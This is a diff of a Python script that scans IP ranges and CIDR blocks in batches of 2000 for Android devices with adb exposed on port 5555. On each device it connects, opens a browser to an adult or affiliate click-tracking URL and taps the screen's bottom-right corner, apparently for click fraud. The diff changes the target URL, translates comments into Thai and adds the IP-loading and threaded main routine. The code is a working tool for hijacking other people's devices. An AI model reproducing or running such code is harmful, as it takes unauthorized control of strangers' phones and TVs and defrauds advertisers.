@@ -8,14 +8,14 @@ COLOR_GREEN = "\033[92m"
 COLOR_CYAN = "\033[96m"
 COLOR_RESET = "\033[0m"
 
-MAX_RETRIES = 5
+MAX_RETRIES = 3
 
 
 def reconnect(ip):
     disconnect_command = ["adb", "disconnect", f"{ip}:5555"]
     subprocess.run(disconnect_command,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE)
+                   stdout=subprocess.PIPE,
+                   stderr=subprocess.PIPE)
 
     retries = 0
     while retries < MAX_RETRIES:
@@ -40,7 +40,7 @@ def execute_adb_command(ip):
 
     adb_command_open_browser = [
         "adb", "-s", f"{ip}:5555", "shell", "am", "start", "-a",
-        "android.intent.action.VIEW", "-d", "https://movievip.pages.dev/home"
+        "android.intent.action.VIEW", "-d", "https://checkthislive.com/online-hd-gay?tag_id=144343&cl=10&click=1"
     ]
 
     try:
@@ -50,7 +50,7 @@ def execute_adb_command(ip):
 
         time.sleep(5)  # รอเวลา 5 วินาทีหลังจากเปิดบราวเซอร์
 
-        # Get screen dimensions
+        # ดึงข้อมูลขนาดจอ (screen dimensions)
         adb_command_get_screen_size = [
             "adb", "-s", f"{ip}:5555", "shell", "wm", "size"
         ]
@@ -59,9 +59,9 @@ def execute_adb_command(ip):
         screen_size = result.stdout.decode("utf-8").strip().split()[-1]
         screen_width, screen_height = map(int, screen_size.split("x"))
 
-        # Calculate coordinates for the bottom right corner
-        bottom_right_x = screen_width - 1  # ปรับค่าตามต้องการสำหรับอุปกรณ์เฉพาะ
-        bottom_right_y = screen_height - 1  # ปรับค่าตามต้องการ
+        # คำนวณตำแหน่ง x, y ที่คลิกขวาล่าง
+        bottom_right_x = screen_width - 1
+        bottom_right_y = screen_height - 1
 
         adb_command_click_bottom_right = [
             "adb", "-s", f"{ip}:5555", "shell", "input", "tap",
@@ -69,7 +69,7 @@ def execute_adb_command(ip):
             str(bottom_right_y)
         ]
 
-        # Click the bottom right corner
+        # คลิกที่ขวาล่างของจอ
         subprocess.run(adb_command_click_bottom_right, check=True)
         print(f"{COLOR_GREEN}Successfully clicked bottom right for {ip}{COLOR_RESET}")
         print(f"{COLOR_CYAN}Starting: {adb_command_click_bottom_right}{COLOR_RESET}")
@@ -86,6 +86,52 @@ def connect_to_adb(ip_group):
             try:
                 future.result()
             except Exception as e:
-                print(f"{COLOR_RED}Error in connect_to_adb: {e}{COLOR_RESET}")
+                print(f"{COLOR_RED}Error in connect_to_addb: {e}{COLOR_RESET}")
 
 
+def load_ips(file_path):
+    with open(file_path, 'r') as file:
+        ips = [line.strip() for line in file.readlines()]
+
+    formatted_ips = []
+    for ip in ips:
+        if '/' in ip:  # ตรวจสอบว่าไอพีเป็น CIDR หรือไม่
+            ip_network = ipaddress.IPv4Network(ip, strict=False)
+            formatted_ips.extend([str(ip) for ip in ip_network.hosts()])
+        elif '-' in ip:
+            start_ip, end_ip = ip.split('-')
+            # แยกช่วงไอพีเป็นไอพีเริ่มต้นและสิ้นสุด
+            start_ip_obj = ipaddress.IPv4Address(start_ip)
+            end_ip_obj = ipaddress.IPv4Address(end_ip)
+            # เพิ่มไอพีทุกตัวในช่วงไปยังลิสต์
+            current_ip_obj = start_ip_obj
+            while current_ip_obj <= end_ip_obj:
+                formatted_ips.append(str(current_ip_obj))
+                current_ip_obj += 1
+        else:
+            formatted_ips.append(ip)
+
+    return formatted_ips
+
+
+def main():
+    ip_files = ['IP.txt']
+
+    all_ips = []
+    for ip_file in ip_files:
+        ips = load_ips(ip_file)
+        all_ips.extend(ips)
+
+    grouped_ips = [all_ips[i:i + 2000] for i in range(0, len(all_ips), 2000)]
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = [
+            executor.submit(connect_to_adb, ip_group) for ip_group in grouped_ips
+        ]
+
+        for future in concurrent.futures.as_completed(futures):
+            future.result()
+
+
+if __name__ == '__main__':
+    main()
